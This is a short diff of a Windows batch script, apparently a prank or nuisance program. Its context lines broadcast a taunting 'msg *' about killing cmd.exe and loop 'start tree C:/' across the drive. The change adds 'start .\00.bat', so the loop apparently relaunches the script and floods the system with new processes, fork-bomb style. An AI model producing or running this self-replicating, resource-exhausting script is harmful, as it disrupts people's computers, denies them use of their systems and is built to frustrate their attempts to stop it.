@@ -38,7 +38,7 @@ msg * I don't think you are clever enough to run TASKKILL /im cmd.exe /f
 
 start tree C:/
 REM Your directory path here
-
+start .\00.bat
 
 echo Ooops
 goto loop2
